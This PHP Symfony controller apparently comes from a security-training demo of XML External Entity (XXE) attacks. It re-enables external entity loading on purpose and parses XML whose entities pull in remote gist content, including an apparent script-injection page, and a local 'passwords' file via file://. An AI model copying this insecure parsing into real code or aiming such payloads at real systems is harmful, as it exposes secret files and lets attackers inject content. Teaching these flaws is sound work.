<?php

namespace App\Controller;

use App\Interfaces\ReflectionInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;

class XxeController extends Controller
{
    /**
     * @Route("/xxe-remote1", name="xxe_remote1")
     */
    public function remote1(ReflectionInterface $reflection)
    {
        $xmlString = '
            <!DOCTYPE product [<!ENTITY remote SYSTEM
            "https://gist.githubusercontent.com/afilina/61fb166d4b8e4a1786e2db84cc0114e5/raw/1283a514479fd8550551321ede8673694a9cfa37/gistfile1.txt">]>
            <product>
              <id>1</id>
              <name>&remote;</name>
            </product>';

        libxml_disable_entity_loader(false);
        $xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NOENT);
        $json = json_encode($xml);
        $product = json_decode($json,true);

        return $this->render('xxe/index.html.twig', [
            'product' => $product,
            'code' => $reflection->getMethodLines($this, 'remote1', 1, 12, true),
            'fileContent' => file_get_contents('https://gist.githubusercontent.com/afilina/61fb166d4b8e4a1786e2db84cc0114e5/raw/1283a514479fd8550551321ede8673694a9cfa37/gistfile1.txt'),
        ]);
    }

    /**
     * @Route("/xxe-remote2", name="xxe_remote2")
     */
    public function remote2(ReflectionInterface $reflection)
    {
        $xmlString = '
            <!DOCTYPE product [<!ENTITY remote SYSTEM
            "https://gist.githubusercontent.com/afilina/787ff18f493883382c960ec9ba2bfd70/raw/25ddc4d58ff69df93c0d377f7c4be1878ed42ad8/alert.html">]>
            <product>
              <id>1</id>
              <name>&remote;</name>
            </product>';

        libxml_disable_entity_loader(false);
        $xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NOENT);
        $json = json_encode($xml);
        $product = json_decode($json,true);

        return $this->render('xxe/index.html.twig', [
            'product' => $product,
            'code' => $reflection->getMethodLines($this, 'remote2', 1, 12, true),
            'fileContent' => file_get_contents('https://gist.githubusercontent.com/afilina/787ff18f493883382c960ec9ba2bfd70/raw/25ddc4d58ff69df93c0d377f7c4be1878ed42ad8/alert.html'),
        ]);
    }

    /**
     * @Route("/xxe-filesystem", name="xxe_filesystem")
     */
    public function filesystem(ReflectionInterface $reflection)
    {
        $xmlString = '
            <!DOCTYPE product [<!ENTITY remote SYSTEM
            "file:///Users/afilina/Projects/zenika/training/php-sec/demo/passwords">]>
            <product>
              <id>1</id>
              <name>&remote;</name>
            </product>';

        libxml_disable_entity_loader(false);
        $xml = simplexml_load_string($xmlString, 'SimpleXMLElement', LIBXML_NOENT);
        $json = json_encode($xml);
        $product = json_decode($json,true);

        return $this->render('xxe/index.html.twig', [
            'product' => $product,
            'code' => $reflection->getMethodLines($this, 'filesystem', 1, 12, true),
        ]);
    }
}
